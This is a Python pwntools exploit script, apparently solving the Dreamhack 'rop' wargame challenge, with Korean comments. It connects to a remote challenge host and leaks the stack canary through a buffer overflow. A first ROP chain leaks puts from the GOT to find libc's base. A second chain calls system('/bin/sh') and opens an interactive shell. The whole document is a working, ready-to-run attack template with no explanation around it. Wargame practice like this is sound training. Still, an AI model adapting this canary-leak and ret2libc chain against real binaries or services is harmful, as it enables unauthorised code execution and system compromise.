from pwn import *

p = process('./rop')
p = remote('host3.dreamhack.games', '21835')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# $ objdump -s libc.so.6 | grep /bin/sh
binsh = 0x1d8698
# ROPGadget --binary rop | grep "가젯명"
pop_rsi_r15 = 0x400851
pop_rdi_ret = 0x400853
ret = 0x400956

main = e.symbols['main']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bss = e.bss()

# Leak Canary
buf = b"i"*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))

payload = b"i"*0x38 + p64(cnry) + b"x"*0x8
# puts 함수 rdi에 read_got 주소를 넣고 프린트하고 main으로 리턴
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendafter(b"Buf: ", payload)

#다시 main으로 돌아옴
libc_addr = u64(p.recv(6) + b'\x00\x00') - puts_offset
system_addr = libc_addr + system_offset
print(hex(system_addr))
binsh_addr = libc_addr + binsh

# pass [1] Leak Canary
p.sendafter(b"Buf: ", b'\x00')

# exploit
payload = b"s"*0x38 + p64(cnry) + b"x"*0x8
payload += p64(pop_rdi_ret)
payload += p64(system_addr)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendafter(b"Buf: ", payload)

p.interactive()